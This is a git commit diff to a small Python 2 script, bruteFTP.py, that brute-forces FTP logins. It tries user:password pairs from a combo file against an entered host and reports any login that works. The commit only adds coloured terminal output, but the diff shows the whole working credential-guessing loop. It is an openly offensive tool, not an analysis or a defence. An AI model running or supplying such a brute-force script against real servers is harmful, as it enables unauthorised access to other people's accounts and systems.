5dd9547d711f6adc358600120b7d01156c7fc3e2
0xB9 <0xB9@protonmail.com>
2018-04-02 23:04:35 -0400

    bruteFTP huepy

--- bruteFTP/bruteFTP.py
+++ bruteFTP/bruteFTP.py
@@ -1,31 +1,35 @@
 #!/usr/bin/python
 import ftplib
 import time
+from huepy import *
 
-
-print "bruteFTP Login"
-print "Made By: 0xB9\n"
+print green("-"*60)
+print lightcyan("bruteFTP Login")
+print lightcyan("Made By: "+italic("0xB9"))
+print green("-"*60)
+print ""
 time.sleep(1)
 
-host = raw_input("Enter A Host-> ")
+host = raw_input(green("Enter A Host-> "))
+print ""
 
 def bruteFTP(hostname, comboList):
     c = open(comboList, 'r')
     for line in c.readlines():
         user = line.split(':')[0]
         pwd = line.split(':')[1].strip('\r').strip('\n')
-        print "[*] Testing: "+user+":"+pwd
+        print run("Testing: "+user+":"+pwd)
 
         try:
             ftp = ftplib.FTP(hostname)
             ftp.login(user, pwd)
-            print "\n[+] "+str(hostname)+" FTP Login: "+user+":"+pwd
+            print "\n"+good(str(hostname)+" FTP Login: "+user+":"+pwd+"\n")
             ftp.quit()
             return (user, pwd)
         except Exception, e:
             pass
 
-    print "\n[-] Couldn\'t brute force FTP login..."
+    print "\n"+bad("Couldn\'t brute force FTP login...\n")
     return (None, None)
 
 comboList = 'combo.txt'
